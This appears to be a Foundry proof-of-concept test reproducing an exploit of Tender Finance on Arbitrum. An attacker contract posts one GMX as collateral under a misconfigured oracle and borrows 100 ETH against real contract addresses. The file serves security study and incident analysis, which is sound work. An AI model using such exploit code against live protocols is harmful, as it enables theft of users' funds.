// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ITenderMarket {
    function mint(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) external returns (uint256);
}

interface ITenderComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

contract TenderFinanceAttacker {
    IERC20 private constant GMX = IERC20(0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a);
    ITenderMarket private constant T_GMX = ITenderMarket(0x20a6768F6AABF66B787985EC6CE0EBEa6D7Ad497);
    ITenderMarket private constant T_ETH = ITenderMarket(0x0706905b2b21574DEFcF00B5fc48068995FCdCdf);
    ITenderComptroller private constant COMPTROLLER =
        ITenderComptroller(0xeed247Ba513A8D6f78BE9318399f5eD1a4808F8e);

    function attack() external {
        GMX.approve(address(T_GMX), 1 ether);
        require(T_GMX.mint(1 ether) == 0, "mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(T_GMX);
        COMPTROLLER.enterMarkets(markets);

        // Tender configured the GMX oracle with an extra 1e10 multiplier.
        // One GMX was therefore accepted as enough collateral for this loan.
        require(T_ETH.borrow(100 ether) == 0, "borrow failed");
    }

    receive() external payable {}
}

contract TenderFinanceExploitTest is Test {
    IERC20 private constant GMX = IERC20(0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a);

    function testExploit() public {
        // Block immediately before the white hat approved and deposited one GMX.
        vm.createSelectFork("https://arbitrum-one-rpc.publicnode.com", 67_539_248);

        TenderFinanceAttacker attacker = new TenderFinanceAttacker();
        deal(address(GMX), address(attacker), 1 ether);
        attacker.attack();

        assertEq(address(attacker).balance, 100 ether);
    }
}
